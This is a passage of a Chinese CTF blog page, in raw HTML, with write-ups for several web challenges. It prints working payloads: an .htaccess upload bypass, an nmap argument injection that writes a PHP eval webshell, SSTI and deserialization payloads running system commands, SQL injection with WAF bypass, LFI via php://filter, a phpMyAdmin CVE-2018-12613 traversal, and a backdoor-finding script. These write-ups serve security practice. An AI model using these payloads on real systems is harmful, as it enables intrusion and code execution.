operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Do you want to be my girlfriend"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="GXYCTF2019-BabyUpload"   >          <a href="#GXYCTF2019-BabyUpload" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2>      <p>首先尝试上传php文件，被过滤，尝试png图片，过滤，只能上传jpeg了，成功</p><p>发现服务器是apache服务器，尝试上传.htaccess文件</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .jpeg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 20.14.17.png)</p><p>成功</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 20.18.24.png)</p><p>蚁剑链接即可</p>        <h2 id="BUUCTF-2018-Online-Tool"   >          <a href="#BUUCTF-2018-Online-Tool" class="heading-link"><i class="fas fa-link"></i></a><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2>      <p>上来两个函数escapeshellarg()和escapeshellcmd()</p><pre class="line-numbers language-none"><code class="language-none">escapeshellarg()将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec(),system()执行运算符。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">escapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。反斜线（\）会在以下字符之前插入：&amp;#;&#96;|*?~&lt;&gt;^()[]&#123;&#125;$,\x0A和\xFF。&#39;和&quot;仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!字符都会被空格代替。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>两个函数使用的例子</p><pre class="line-numbers language-none"><code class="language-none">原始输入 172.17.0.2&#39; -v -d a&#x3D;1escapeshellarg处理后 &#39;172.17.0.2&#39;&#39;&#39; -v -d a&#x3D;1&#39;escapeshellcmd处理后 &#39;172.17.0.2&#39;\&#39;&#39; -v -d a&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在本题中，使用的nmap有一个名为-oG的参数选项，可以将nmap的命令和执行结果写入文件</p><pre class="line-numbers language-none"><code class="language-none">payload:?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;kkk&quot;]);?&gt; -oG kkk.php &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传入后变为</p><pre class="line-numbers language-none"><code class="language-none">nmap -T5 -sT -Pn --host-timeout 2 -F &#39;&#39;&lt;?php @eval($_POST[&quot;kkk&quot;]);?&gt; -oG kkk.php&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="BJDCTF2020-The-mystery-of-ip"   >          <a href="#BJDCTF2020-The-mystery-of-ip" class="heading-link"><i class="fas fa-link"></i></a><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2>      <p>SSTI模版注入，以后学了在理解吧</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: &#123;&#123;system(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="RoarCTF-2019-Easy-Calc"   >          <a href="#RoarCTF-2019-Easy-Calc" class="heading-link"><i class="fas fa-link"></i></a><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2>      <p>PHP字符串解析漏洞，查看数据包访问calc.php</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.29.28.png)</p><p>尝试传入scandir()扫描文件，发现WAF阻挡，将传入参数由num改为 num，php获取到的参数名称为num而WAF获取到 num，绕过WAF成功，扫描发现在根目录下有f1agg文件，使用file_get_content函数读取文件即可</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-14" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.35.38.png)</p>        <h2 id="网鼎杯-2018-Fakebook"   >          <a href="#网鼎杯-2018-Fakebook" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2>      <p>首先注册后进入，发现no疑似存在SQL注入，尝试union select被过滤，尝试union/**/select成功</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-15" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 13.17.59.png)</p><p>爆出回显位置，以及似乎网页对数据库内容进行了反序列化，稍后再看，先进行SQL注入爆出内容</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-15" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 13.19.45.png)</p><p>发现用户信息是被序列化后存储在数据库中的，下一步应当尝试查看源码进行反序列化了，访问robots.txt发现了网站源码，源码对用户传入的博客链接进行访问并渲染，直接将链接改为本地文件并渲染，得到flag</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-15" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 13.30.53.png)</p>        <h2 id="GXYCTF2019-禁止套娃"   >          <a href="#GXYCTF2019-禁止套娃" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2>      <p>首先看robots.txt发现没有内容，扫目录扫出.git，猜测有源码泄露，使用gitHack得到index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一步过滤了所有伪协议，只能执行函数了，下一步查看正则，大佬的解释如下</p><pre class="line-numbers language-none"><code class="language-none">(?R)是引用当前表达式，(?R)? 这里多一个?表示可以有引用，也可以没有。，引用一次正则则变成了[a-z,_]+\([a-z,_]+\((?R)?\)\),可以迭代下去，那么它所匹配的就是print(echo(1))、a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终我们就是要构造一个无参嵌套函数执行，首先尝试扫描文件，查看是否有flag文件存在</p><p>知识点：localeconv函数返回一包含本地数字及货币格式信息的数组</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.15.48.png)</p><p>通过这个函数第一项我们可以拿到.，进而可以使用scandir函数扫描目录文件</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.17.17.png)</p><p>通过current取出第一位.，flag.php在倒数第二的位置，先使用array_reverse函数倒转排序，在使用next取第二位，使用hightlight_file读出文件</p><pre class="line-numbers language-none"><code class="language-none">payload:?exp&#x3D;highlight_file(next(array_reverse(scandir(current(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.19.48.png)</p>        <h2 id="GWCTF-2019-我有一个数据库"   >          <a href="#GWCTF-2019-我有一个数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2>      <p>进去就告诉你数据库是空的，先扫个文件吧，发现有robots.txt和/phpmyadmin/，先看robots，提示去phpinfo.php，就是个phpinfo页面，也没啥提示，看phpmyadmin，数据库里还真没东西</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-22" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 15.25.46.png)</p><p>看WP，发现是一个关于phpmyadmin的远程文件包含漏洞<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/qq_43579362/article/details/108476182" >CVE-2018-12613</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>出现bug的代码位置：phpMyAdmin/index.php</p><p><img src="https://img-blog.csdnimg.cn/20200908202849454.png"></p><p>可以看到传入的target需要满足的条件：</p><p>1、是字符串</p><p>2、没有index</p><p>3、不<code>target_blacklist</code>中</p><p>4、满足<code>Core</code>类中<code>checkPageValidity</code>函数检查</p><p>最后一个条件的有关代码如下</p><p><img src="https://img-blog.csdnimg.cn/20200908203030418.png"></p><p>上述函数可知，如果想要函数返回真，需要满足以下三个条件的任意一个</p><p>1、<code>$page</code>变量值在<code>$white_list</code>数组中</p><p>2、经过<code>mb_substr()</code>和<code>mb_strpos()</code>处理的<code>$page–&gt;$_page</code>的变量值在<code>$_whitelist</code>数组中，</p><p>3、经过<code>urldecode(),mb_substr(),mb_strpos()</code>处理的<code>$page–&gt;$_page</code>的变量值在<code>$_whitelist</code>数组中，</p><p><img src="https://img-blog.csdnimg.cn/20200908204934607.png"></p><p>开始构造payload，先挑一个在whitelist中的文件db_datadict.php然后加问号和我们想要包含的文件</p><pre class="line-numbers language-none"><code class="language-none">payload:?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-22" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 15.45.08.png)</p>        <h2 id="网鼎杯-2020-朱雀组-phpweb"   >          <a href="#网鼎杯-2020-朱雀组-phpweb" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2>      <p>打开网站查看源码，发现有一个延时5秒提交的参数，抓包查看参数名称发现可能是执行函数的东西，尝试highlight_file读取页面源码成功</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) &#123;        $result &#x3D; call_user_func($func, $p);        $a&#x3D; gettype($result);        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;            return $result;        &#125; else &#123;return &quot;&quot;;&#125;    &#125;    class Test &#123;        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;        var $func &#x3D; &quot;date&quot;;        function __destruct() &#123;            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;                echo gettime($this-&gt;func, $this-&gt;p);            &#125;        &#125;    &#125;    $func &#x3D; $_REQUEST[&quot;func&quot;];    $p &#x3D; $_REQUEST[&quot;p&quot;];    if ($func !&#x3D; null) &#123;        $func &#x3D; strtolower($func);        if (!in_array($func,$disable_fun)) &#123;            echo gettime($func, $p);        &#125;else &#123;            die(&quot;Hacker...&quot;);        &#125;    &#125;    ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了大部分危险函数，继续看发现有一个Test类在销毁时会执行函数，可通过反序列化绕过函数禁用</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-23" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 00.33.29.png)</p><p>尝试构造成功，但没有发现flag，搜索一下发现在/tmp/flagoefiu4r93</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTfunc&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;tac &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-23" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 00.36.23.png)</p>        <h2 id="BSidesCF-2020-Had-a-bad-day"   >          <a href="#BSidesCF-2020-Had-a-bad-day" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2>      <p>选猫猫或狗狗后url中出现注入点，尝试读取文件</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-25" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-25</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.42.45.png)</p><p>似乎会自动补后缀，去掉.php，读取源码</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php$file &#x3D; $_GET[&#39;category&#39;];if(isset($file))&#123;if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))    &#123;include ($file . &#39;.php&#39;);&#125;else&#123;echo &quot;Sorry, we currently only support woofers and meowers.&quot;;&#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>包含的条件是参数中有woofers，meowers或者index，任选一个构造payload，再使用过滤器base64编码就可以</p><pre class="line-numbers language-none"><code class="language-none">payload:?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index&#x2F;..&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="BJDCTF2020-Mark-loves-cat"   >          <a href="#BJDCTF2020-Mark-loves-cat" class="heading-link"><i class="fas fa-link"></i></a><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>      <p>啥也没有先扫吧，扫出.git，githack跑一下，看源码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;index.php&lt;?php$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);$yds &#x3D; &quot;dog&quot;;$is &#x3D; &quot;cat&quot;;$handsome &#x3D; &#39;yds&#39;;foreach($_POST as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    $$x &#x3D; $$y;&#125;foreach($_GET as $x &#x3D;&gt; $y)&#123;    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;        exit($handsome);    &#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    exit($yds);&#125;if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用第二个判断，$yds=$flag即可</p><pre class="line-numbers language-none"><code class="language-none">payload:?yds&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="强网杯-2019-高明的黑客"   >          <a href="#强网杯-2019-高明的黑客" class="heading-link"><i class="fas fa-link"></i></a><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2>      <p>下载源码，3000个文件，打开看内容中有许多eval函数，但是执行时内容不一定可用，编写脚本进行测试</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> repath<span class="token operator">=</span><span class="token string">"C:\phpstudy_pro\WWW\src\\"</span>files<span class="token operator">=</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    parm<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> gets<span class="token punctuation">:</span>        parm<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"echo 'jlanhere';"</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> posts<span class="token punctuation">:</span>        data<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'jlanhere';"</span>    tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://src/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>params<span class="token operator">=</span>parm<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> <span class="token string">"jlanhere"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>        tp<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> gets<span class="token punctuation">:</span>            tp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            tp<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'jlanhere';"</span>            textt <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://src/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>params<span class="token operator">=</span>tp<span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">if</span> <span class="token string">"jlanhere"</span> <span class="token keyword">in</span> textt<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> posts<span class="token punctuation">:</span>            tp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            tp<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'jlanhere';"</span>            textt <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://src/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>data<span class="token operator">=</span>tp<span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">if</span> <span class="token string">"jlanhere"</span> <span class="token keyword">in</span> textt<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"post"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找出一个注入点</p><pre class="line-numbers language-none"><code class="language-none">payload:xk0SzyKwfzw.php?Efa5BVG&#x3D;cat &#x2F;flag<span aria-hidden="true" 